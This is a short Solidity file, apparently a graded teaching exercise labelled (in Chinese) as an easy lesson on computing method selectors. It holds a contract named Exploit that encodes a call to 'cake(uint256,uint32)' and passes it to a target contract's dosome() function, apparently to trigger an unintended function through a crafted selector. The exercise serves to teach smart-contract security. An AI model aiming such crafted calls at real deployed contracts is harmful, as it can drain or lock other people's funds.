// SPDX-License-Identifier: MIT

/// @knowledgePoint 方法选择器的计算

/// @level 简单

pragma solidity ^0.8.0;

interface Cake {
    function dosome(bytes memory) external;
}
contract Exploit {
    address public cake;
    bytes data = abi.encodeWithSignature("cake(uint256,uint32)",0,0);
    constructor(address _cake) {
        cake = _cake;
    }

    function exploit() external {
        Cake(cake).dosome(data);
    }
}